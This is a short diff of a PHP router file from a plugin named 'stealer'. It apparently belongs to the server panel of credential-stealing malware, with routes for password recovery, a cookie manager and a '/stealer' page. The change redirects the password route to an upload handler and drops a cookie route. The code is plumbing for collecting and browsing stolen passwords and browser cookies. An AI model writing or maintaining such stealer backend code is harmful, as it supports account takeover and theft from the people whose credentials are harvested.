@@ -5,8 +5,8 @@ require ("Controller/Recovery.class.php");
 $GLOBALS["foundPlugins"]["stealer"]["plugindir"] = __DIR__;
 
 
-$router->all('/passwordrecovery', 'Recovery@passwordrecovery');
-$router->all('/cookierecovery', 'Recovery@cookierecovery');
+$router->all('/passwordrecovery', 'Recovery@upload');
+
 
 $router->all('/stealer', 'PassMain@passrecovery');
 $router->all('/cookiemanager/(\d+)', 'PassMain@cookiemanager');
